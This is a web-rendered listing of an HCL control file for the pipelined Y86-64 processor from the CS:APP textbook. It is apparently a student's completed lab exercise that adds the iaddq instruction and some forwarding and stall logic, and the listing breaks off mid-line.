class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript"><span class="hljs-comment">#/* $begin pipe-all-hcl */</span><br><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">##</span><br><span class="hljs-comment">#    HCL Description of Control for Pipelined Y86-64 Processor     #</span><br><span class="hljs-comment">#    Copyright (C) Randal E. Bryant, David R. O&#x27;Hallaron, 2014     #</span><br><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">##</span><br><span class="hljs-comment">## Your task is to implement the iaddq instruction</span><br><span class="hljs-comment">## The file contains a declaration of the icodes</span><br><span class="hljs-comment">## for iaddq (IIADDQ)</span><br><span class="hljs-comment">## Your job is to add the rest of the logic to make it work</span><br><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">##</span><br><span class="hljs-comment">#    C Include&#x27;s.  Don&#x27;t alter these                               #</span><br><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">##</span><br>quote <span class="hljs-string">&#x27;#include &lt;stdio.h&gt;&#x27;</span><br>quote <span class="hljs-string">&#x27;#include &quot;isa.h&quot;&#x27;</span><br>quote <span class="hljs-string">&#x27;#include &quot;pipeline.h&quot;&#x27;</span><br>quote <span class="hljs-string">&#x27;#include &quot;stages.h&quot;&#x27;</span><br>quote <span class="hljs-string">&#x27;#include &quot;sim.h&quot;&#x27;</span><br>quote <span class="hljs-string">&#x27;int sim_main(int argc, char *argv[]);&#x27;</span><br>quote <span class="hljs-string">&#x27;int main(int argc, char *argv[])&#123;return sim_main(argc,argv);&#125;&#x27;</span><br><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">##</span><br><span class="hljs-comment">#    Declarations.  Do not change/remove/delete any of these       #</span><br><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">##</span><br><span class="hljs-comment">##### Symbolic representation of Y86-64 Instruction Codes ###</span><span class="hljs-comment">######</span><span class="hljs-comment">####</span><br><span class="hljs-comment">wordsig INOP &#x27;I_NOP&#x27;</span><br><span class="hljs-comment">wordsig IHALT&#x27;I_HALT&#x27;</span><br><span class="hljs-comment">wordsig IRRMOVQ&#x27;I_RRMOVQ&#x27;</span><br><span class="hljs-comment">wordsig IIRMOVQ&#x27;I_IRMOVQ&#x27;</span><br><span class="hljs-comment">wordsig IRMMOVQ&#x27;I_RMMOVQ&#x27;</span><br><span class="hljs-comment">wordsig IMRMOVQ&#x27;I_MRMOVQ&#x27;</span><br><span class="hljs-comment">wordsig IOPQ&#x27;I_ALU&#x27;</span><br><span class="hljs-comment">wordsig IJXX&#x27;I_JMP&#x27;</span><br><span class="hljs-comment">wordsig ICALL&#x27;I_CALL&#x27;</span><br><span class="hljs-comment">wordsig IRET&#x27;I_RET&#x27;</span><br><span class="hljs-comment">wordsig IPUSHQ&#x27;I_PUSHQ&#x27;</span><br><span class="hljs-comment">wordsig IPOPQ&#x27;I_POPQ&#x27;</span><br><span class="hljs-comment"># Instruction code for iaddq instruction</span><br><span class="hljs-comment">wordsig IIADDQ&#x27;I_IADDQ&#x27;</span><br><span class="hljs-comment">###</span><span class="hljs-comment">## Symbolic represenations of Y86-64 function codes            #####</span><br>wordsig FNONE    <span class="hljs-string">&#x27;F_NONE&#x27;</span>        <span class="hljs-comment"># Default function code</span><br><span class="hljs-comment">##### Symbolic representation of Y86-64 Registers referenced      ###</span><span class="hljs-comment">##</span><br>wordsig RRSP     <span class="hljs-string">&#x27;REG_RSP&#x27;</span>         <span class="hljs-comment"># Stack Pointer</span><br>wordsig RNONE    <span class="hljs-string">&#x27;REG_NONE&#x27;</span>        <span class="hljs-comment"># Special value indicating &quot;no register&quot;</span><br><span class="hljs-comment">##### ALU Functions referenced explicitly ###</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">#####</span><br><span class="hljs-comment">wordsig ALUADD&#x27;A_ADD&#x27;     # ALU should add its arguments</span><br><span class="hljs-comment">###</span><span class="hljs-comment">## Possible instruction status values                       #####</span><br>wordsig SBUB<span class="hljs-string">&#x27;STAT_BUB&#x27;</span><span class="hljs-comment"># Bubble in stage</span><br>wordsig SAOK<span class="hljs-string">&#x27;STAT_AOK&#x27;</span><span class="hljs-comment"># Normal execution</span><br>wordsig SADR<span class="hljs-string">&#x27;STAT_ADR&#x27;</span><span class="hljs-comment"># Invalid memory address</span><br>wordsig SINS<span class="hljs-string">&#x27;STAT_INS&#x27;</span><span class="hljs-comment"># Invalid instruction</span><br>wordsig SHLT<span class="hljs-string">&#x27;STAT_HLT&#x27;</span><span class="hljs-comment"># Halt instruction encountered</span><br><span class="hljs-comment">##### Signals that can be referenced by control logic ###</span><span class="hljs-comment">######</span><span class="hljs-comment">#####</span><br><span class="hljs-comment">###</span><span class="hljs-comment">## Pipeline Register F ##########################################</span><br>wordsig F_predPC <span class="hljs-string">&#x27;pc_curr-&gt;pc&#x27;</span>     <span class="hljs-comment"># Predicted value of PC</span><br><span class="hljs-comment">##### Intermediate Values in Fetch Stage ###</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><br>wordsig imem_icode  <span class="hljs-string">&#x27;imem_icode&#x27;</span>      <span class="hljs-comment"># icode field from instruction memory</span><br>wordsig imem_ifun   <span class="hljs-string">&#x27;imem_ifun&#x27;</span>       <span class="hljs-comment"># ifun  field from instruction memory</span><br>wordsig f_icode<span class="hljs-string">&#x27;if_id_next-&gt;icode&#x27;</span>  <span class="hljs-comment"># (Possibly modified) instruction code</span><br>wordsig f_ifun<span class="hljs-string">&#x27;if_id_next-&gt;ifun&#x27;</span>   <span class="hljs-comment"># Fetched instruction function</span><br>wordsig f_valC<span class="hljs-string">&#x27;if_id_next-&gt;valc&#x27;</span>   <span class="hljs-comment"># Constant data of fetched instruction</span><br>wordsig f_valP<span class="hljs-string">&#x27;if_id_next-&gt;valp&#x27;</span>   <span class="hljs-comment"># Address of following instruction</span><br>boolsig imem_error <span class="hljs-string">&#x27;imem_error&#x27;</span>     <span class="hljs-comment"># Error signal from instruction memory</span><br>boolsig instr_valid <span class="hljs-string">&#x27;instr_valid&#x27;</span>    <span class="hljs-comment"># Is fetched instruction valid?</span><br><span class="hljs-comment">##### Pipeline Register D ###</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">###</span><br><span class="hljs-comment">wordsig D_icode &#x27;if_id_curr-&gt;icode&#x27;   # Instruction code</span><br><span class="hljs-comment">wordsig D_rA &#x27;if_id_curr-&gt;ra&#x27;     # rA field from instruction</span><br><span class="hljs-comment">wordsig D_rB &#x27;if_id_curr-&gt;rb&#x27;     # rB field from instruction</span><br><span class="hljs-comment">wordsig D_valP &#x27;if_id_curr-&gt;valp&#x27;     # Incremented PC</span><br><span class="hljs-comment">###</span><span class="hljs-comment">## Intermediate Values in Decode Stage  #########################</span><br>wordsig d_srcA <span class="hljs-string">&#x27;id_ex_next-&gt;srca&#x27;</span>  <span class="hljs-comment"># srcA from decoded instruction</span><br>wordsig d_srcB <span class="hljs-string">&#x27;id_ex_next-&gt;srcb&#x27;</span>  <span class="hljs-comment"># srcB from decoded instruction</span><br>wordsig d_rvalA <span class="hljs-string">&#x27;d_regvala&#x27;</span>     <span class="hljs-comment"># valA read from register file</span><br>wordsig d_rvalB <span class="hljs-string">&#x27;d_regvalb&#x27;</span>     <span class="hljs-comment"># valB read from register file</span><br><span class="hljs-comment">##### Pipeline Register E ###</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">###</span><br><span class="hljs-comment">wordsig E_icode &#x27;id_ex_curr-&gt;icode&#x27;   # Instruction code</span><br><span class="hljs-comment">wordsig E_ifun  &#x27;id_ex_curr-&gt;ifun&#x27;    # Instruction function</span><br><span class="hljs-comment">wordsig E_valC  &#x27;id_ex_curr-&gt;valc&#x27;    # Constant data</span><br><span class="hljs-comment">wordsig E_srcA  &#x27;id_ex_curr-&gt;srca&#x27;    # Source A register ID</span><br><span class="hljs-comment">wordsig E_valA  &#x27;id_ex_curr-&gt;vala&#x27;    # Source A value</span><br><span class="hljs-comment">wordsig E_srcB  &#x27;id_ex_curr-&gt;srcb&#x27;    # Source B register ID</span><br><span class="hljs-comment">wordsig E_valB  &#x27;id_ex_curr-&gt;valb&#x27;    # Source B value</span><br><span class="hljs-comment">wordsig E_dstE &#x27;id_ex_curr-&gt;deste&#x27;    # Destination E register ID</span><br><span class="hljs-comment">wordsig E_dstM &#x27;id_ex_curr-&gt;destm&#x27;    # Destination M register ID</span><br><span class="hljs-comment">###</span><span class="hljs-comment">## Intermediate Values in Execute Stage #########################</span><br>wordsig e_valE <span class="hljs-string">&#x27;ex_mem_next-&gt;vale&#x27;</span><span class="hljs-comment"># valE generated by ALU</span><br>boolsig e_Cnd <span class="hljs-string">&#x27;ex_mem_next-&gt;takebranch&#x27;</span> <span class="hljs-comment"># Does condition hold?</span><br>wordsig e_dstE <span class="hljs-string">&#x27;ex_mem_next-&gt;deste&#x27;</span>      <span class="hljs-comment"># dstE (possibly modified to be RNONE)</span><br><span class="hljs-comment">##### Pipeline Register M                  ###</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">####</span><br><span class="hljs-comment">wordsig M_stat &#x27;ex_mem_curr-&gt;status&#x27;     # Instruction status</span><br><span class="hljs-comment">wordsig M_icode &#x27;ex_mem_curr-&gt;icode&#x27;# Instruction code</span><br><span class="hljs-comment">wordsig M_ifun  &#x27;ex_mem_curr-&gt;ifun&#x27;# Instruction function</span><br><span class="hljs-comment">wordsig M_valA  &#x27;ex_mem_curr-&gt;vala&#x27;      # Source A value</span><br><span class="hljs-comment">wordsig M_dstE &#x27;ex_mem_curr-&gt;deste&#x27;# Destination E register ID</span><br><span class="hljs-comment">wordsig M_valE  &#x27;ex_mem_curr-&gt;vale&#x27;      # ALU E value</span><br><span class="hljs-comment">wordsig M_dstM &#x27;ex_mem_curr-&gt;destm&#x27;# Destination M register ID</span><br><span class="hljs-comment">boolsig M_Cnd &#x27;ex_mem_curr-&gt;takebranch&#x27;# Condition flag</span><br><span class="hljs-comment">boolsig dmem_error &#x27;dmem_error&#x27;        # Error signal from instruction memory</span><br><span class="hljs-comment">###</span><span class="hljs-comment">## Intermediate Values in Memory Stage ##########################</span><br>wordsig m_valM <span class="hljs-string">&#x27;mem_wb_next-&gt;valm&#x27;</span><span class="hljs-comment"># valM generated by memory</span><br>wordsig m_stat <span class="hljs-string">&#x27;mem_wb_next-&gt;status&#x27;</span><span class="hljs-comment"># stat (possibly modified to be SADR)</span><br><span class="hljs-comment">##### Pipeline Register W ###</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">###</span><br><span class="hljs-comment">wordsig W_stat &#x27;mem_wb_curr-&gt;status&#x27;     # Instruction status</span><br><span class="hljs-comment">wordsig W_icode &#x27;mem_wb_curr-&gt;icode&#x27;# Instruction code</span><br><span class="hljs-comment">wordsig W_dstE &#x27;mem_wb_curr-&gt;deste&#x27;# Destination E register ID</span><br><span class="hljs-comment">wordsig W_valE  &#x27;mem_wb_curr-&gt;vale&#x27;      # ALU E value</span><br><span class="hljs-comment">wordsig W_dstM &#x27;mem_wb_curr-&gt;destm&#x27;# Destination M register ID</span><br><span class="hljs-comment">wordsig W_valM  &#x27;mem_wb_curr-&gt;valm&#x27;# Memory M value</span><br><span class="hljs-comment">###</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">#####</span><br><span class="hljs-comment">#    Control Signal Definitions.                                   #</span><br><span class="hljs-comment">###</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">#####</span><br><span class="hljs-comment">###</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment"># Fetch Stage     ###################################</span><br><span class="hljs-comment">## What address should instruction be fetched at</span><br>word f_pc = [<br><span class="hljs-comment"># Mispredicted branch.  Fetch at incremented PC</span><br>M_icode == IJXX &amp;&amp; !M_Cnd : M_valA;<br><span class="hljs-comment"># Completion of RET instruction</span><br>W_icode == IRET : W_valM;<br><span class="hljs-comment"># Default: Use predicted value of PC</span><br><span class="hljs-number">1</span> : F_predPC;<br>];<br><span class="hljs-comment">## Determine icode of fetched instruction</span><br>word f_icode = [<br>imem_error : INOP;<br><span class="hljs-number">1</span>: imem_icode;<br>];<br><span class="hljs-comment"># Determine ifun</span><br>word f_ifun = [<br>imem_error : FNONE;<br><span class="hljs-number">1</span>: imem_ifun;<br>];<br><span class="hljs-comment"># Is instruction valid?</span><br>bool instr_valid = f_icode <span class="hljs-keyword">in</span> <br>&#123; INOP, IHALT, IRRMOVQ, IIRMOVQ, IRMMOVQ, IMRMOVQ,<br>  IOPQ, IJXX, ICALL, IRET, IPUSHQ, IPOPQ, IIADDQ &#125;;<br><span class="hljs-comment"># Determine status code for fetched instruction</span><br>word f_stat = [<br>imem_error: SADR;<br>!instr_valid : SINS;<br>f_icode == IHALT : SHLT;<br><span class="hljs-number">1</span> : SAOK;<br>];<br><span class="hljs-comment"># Does fetched instruction require a regid byte?</span><br>bool need_regids =<br>f_icode <span class="hljs-keyword">in</span> &#123; IRRMOVQ, IOPQ, IPUSHQ, IPOPQ, <br>     IIRMOVQ, IRMMOVQ, IMRMOVQ,  IIADDQ&#125;;<br><span class="hljs-comment"># Does fetched instruction require a constant word?</span><br>bool need_valC =<br>f_icode <span class="hljs-keyword">in</span> &#123; IIRMOVQ, IRMMOVQ, IMRMOVQ, IJXX, ICALL, IIADDQ &#125;;<br><span class="hljs-comment"># Predict next value of PC</span><br>word f_predPC = [<br>f_icode <span class="hljs-keyword">in</span> &#123; IJXX, ICALL &#125; : f_valC;<br><span class="hljs-number">1</span> : f_valP;<br>];<br><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">#### Decode Stage ###</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">#####</span><br><span class="hljs-comment">## What register should be used as the A source?</span><br><span class="hljs-comment">word d_srcA = [</span><br><span class="hljs-comment">D_icode in &#123; IRRMOVQ, IRMMOVQ, IOPQ, IPUSHQ  &#125; : D_rA;</span><br><span class="hljs-comment">D_icode in &#123; IPOPQ, IRET &#125; : RRSP;</span><br><span class="hljs-comment">1 : RNONE; # Don&#x27;t need register</span><br><span class="hljs-comment">];</span><br><span class="hljs-comment">## What register should be used as the B source?</span><br><span class="hljs-comment">word d_srcB = [</span><br><span class="hljs-comment">D_icode in &#123; IOPQ, IRMMOVQ, IMRMOVQ, IIADDQ &#125; : D_rB;</span><br><span class="hljs-comment">D_icode in &#123; IPUSHQ, IPOPQ, ICALL, IRET &#125; : RRSP;</span><br><span class="hljs-comment">1 : RNONE;  # Don&#x27;t need register</span><br><span class="hljs-comment">];</span><br><span class="hljs-comment">## What register should be used as the E destination?</span><br><span class="hljs-comment">word d_dstE = [</span><br><span class="hljs-comment">D_icode in &#123; IRRMOVQ, IIRMOVQ, IOPQ, IIADDQ&#125; : D_rB;</span><br><span class="hljs-comment">D_icode in &#123; IPUSHQ, IPOPQ, ICALL, IRET &#125; : RRSP;</span><br><span class="hljs-comment">1 : RNONE;  # Don&#x27;t write any register</span><br><span class="hljs-comment">];</span><br><span class="hljs-comment">## What register should be used as the M destination?</span><br><span class="hljs-comment">word d_dstM = [</span><br><span class="hljs-comment">D_icode in &#123; IMRMOVQ, IPOPQ &#125; : D_rA;</span><br><span class="hljs-comment">1 : RNONE;  # Don&#x27;t write any register</span><br><span class="hljs-comment">];</span><br><span class="hljs-comment">## What should be the A value?</span><br><span class="hljs-comment">## Forward into decode stage for valA</span><br><span class="hljs-comment">word d_valA = [</span><br><span class="hljs-comment">D_icode in &#123; ICALL, IJXX &#125; : D_valP; # Use incremented PC</span><br><span class="hljs-comment">d_srcA == e_dstE : e_valE;    # Forward valE from execute</span><br><span class="hljs-comment">d_srcA == M_dstM : m_valM;    # Forward valM from memory</span><br><span class="hljs-comment">d_srcA == M_dstE : M_valE;    # Forward valE from memory</span><br><span class="hljs-comment">d_srcA == W_dstM : W_valM;    # Forward valM from write back</span><br><span class="hljs-comment">d_srcA == W_dstE : W_valE;    # Forward valE from write back</span><br><span class="hljs-comment">1 : d_rvalA;  # Use value read from register file</span><br><span class="hljs-comment">];</span><br><span class="hljs-comment">word d_valB = [</span><br><span class="hljs-comment">d_srcB == e_dstE : e_valE;    # Forward valE from execute</span><br><span class="hljs-comment">d_srcB == M_dstM : m_valM;    # Forward valM from memory</span><br><span class="hljs-comment">d_srcB == M_dstE : M_valE;    # Forward valE from memory</span><br><span class="hljs-comment">d_srcB == W_dstM : W_valM;    # Forward valM from write back</span><br><span class="hljs-comment">d_srcB == W_dstE : W_valE;    # Forward valE from write back</span><br><span class="hljs-comment">1 : d_rvalB;  # Use value read from register file</span><br><span class="hljs-comment">];</span><br><span class="hljs-comment">###</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment"># Execute Stage #####################################</span><br><span class="hljs-comment">## Select input A to ALU</span><br>word aluA = [<br>E_icode <span class="hljs-keyword">in</span> &#123; IRRMOVQ, IOPQ &#125; : E_valA;<br>E_icode <span class="hljs-keyword">in</span> &#123; IIRMOVQ, IRMMOVQ, IMRMOVQ, IIADDQ&#125; : E_valC;<br>E_icode <span class="hljs-keyword">in</span> &#123; ICALL, IPUSHQ &#125; : <span class="hljs-number">-8</span>;<br>E_icode <span class="hljs-keyword">in</span> &#123; IRET, IPOPQ &#125; : <span class="hljs-number">8</span>;<br><span class="hljs-comment"># Other instructions don&#x27;t need ALU</span><br>];<br><span class="hljs-comment">## Select input B to ALU</span><br>word aluB = [<br>E_icode <span class="hljs-keyword">in</span> &#123; IRMMOVQ, IMRMOVQ, IOPQ, ICALL, <br>     IPUSHQ, IRET, IPOPQ, IIADDQ&#125; : E_valB;<br>E_icode <span class="hljs-keyword">in</span> &#123; IRRMOVQ, IIRMOVQ &#125; : <span class="hljs-number">0</span>;<br><span class="hljs-comment"># Other instructions don&#x27;t need ALU</span><br>];<br><span class="hljs-comment">## Set the ALU function</span><br>word alufun = [<br>E_icode == IOPQ : E_ifun;<br><span class="hljs-number">1</span> : ALUADD;<br>];<br><span class="hljs-comment">## Should the condition codes be updated?</span><br>bool set_cc = (E_icode == IOPQ || E_icode == IIADDQ) &amp;&amp;<br><span class="hljs-comment"># State changes only during normal operation</span><br>!m_stat <span class="hljs-keyword">in</span> &#123; SADR, SINS, SHLT &#125; &amp;&amp; !W_stat <span class="hljs-keyword">in</span> &#123; SADR, SINS, SHLT &#125;;<br><span class="hljs-comment">## Generate valA in execute stage</span><br>word e_valA = [<br>E_icode <span class="hljs-keyword">in</span> &#123;IRMMOVQ,IPUSHQ&#125; &amp;&amp; E_srcA == M_dstM :m_valM;<br><span class="hljs-number">1</span>:E_valA;    <span class="hljs-comment"># Pass valA through stage</span><br>];<br><span class="hljs-comment">## Set dstE to RNONE in event of not-taken conditional move</span><br>word e_dstE = [<br>E_icode == IRRMOVQ &amp;&amp; !e_Cnd : RNONE;<br><span class="hljs-number">1</span> : E_dstE;<br>];<br><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">#### Memory Stage ###</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">#####</span><br><span class="hljs-comment">## Select memory address</span><br><span class="hljs-comment">word mem_addr = [</span><br><span class="hljs-comment">M_icode in &#123; IRMMOVQ, IPUSHQ, ICALL, IMRMOVQ &#125; : M_valE;</span><br><span class="hljs-comment">M_icode in &#123; IPOPQ, IRET &#125; : M_valA;</span><br><span class="hljs-comment"># Other instructions don&#x27;t need address</span><br><span class="hljs-comment">];</span><br><span class="hljs-comment">## Set read control signal</span><br><span class="hljs-comment">bool mem_read = M_icode in &#123; IMRMOVQ, IPOPQ, IRET &#125;;</span><br><span class="hljs-comment">## Set write control signal</span><br><span class="hljs-comment">bool mem_write = M_icode in &#123; IRMMOVQ, IPUSHQ, ICALL &#125;;</span><br><span class="hljs-comment">#/* $begin pipe-m_stat-hcl */</span><br><span class="hljs-comment">## Update the status</span><br><span class="hljs-comment">word m_stat = [</span><br><span class="hljs-comment">dmem_error : SADR;</span><br><span class="hljs-comment">1 : M_stat;</span><br><span class="hljs-comment">];</span><br><span class="hljs-comment">#/* $end pipe-m_stat-hcl */</span><br><span class="hljs-comment">## Set E port register ID</span><br><span class="hljs-comment">word w_dstE = W_dstE;</span><br><span class="hljs-comment">## Set E port value</span><br><span class="hljs-comment">word w_valE = W_valE;</span><br><span class="hljs-comment">## Set M port register ID</span><br><span class="hljs-comment">word w_dstM = W_dstM;</span><br><span class="hljs-comment">## Set M port value</span><br><span class="hljs-comment">word w_valM = W_valM;</span><br><span class="hljs-comment">## Update processor status</span><br><span class="hljs-comment">word Stat = [</span><br><span class="hljs-comment">W_stat == SBUB : SAOK;</span><br><span class="hljs-comment">1 : W_stat;</span><br><span class="hljs-comment">];</span><br><span class="hljs-comment">###</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment"># Pipeline Register Control #########################</span><br><span class="hljs-comment"># Should I stall or inject a bubble into Pipeline Register F?</span><br><span class="hljs-comment"># At most one of these can be true.</span><br>bool F_bubble = <span class="hljs-number">0</span>;<br>bool F_stall =<br><span class="hljs-comment"># Conditions for a load/use hazard</span><br>E_icode <span class="hljs-keyword">in</span> &#123; IMRMOVQ, IPOPQ &#125; &amp;&amp;<br>(E_dstM <span class="hljs-keyword">in</span> &#123;d_srcB&#125; || E_dstM == d_srcA &amp;&amp;!(D_icode <span class="hljs-keyword">in</span> &#123;IRMMOVQ,IPUSHQ&#125;)) ||<br><span class="hljs-comment"># Stalling at fetch while ret passes through pipeline</span><br>IRET <span class="hljs-keyword">in</span> &#123; D_icode, E_icode, M_icode &#125;;<br><span class="hljs-comment"># Should I stall or inject a bubble into Pipeline Register D?</span><br><span class="hljs-comment"># At most one of these can be true.</span><br>bool D_stall = <br><span class="hljs-comment"># Conditions for a load/use hazard</span><br>E_icode <span 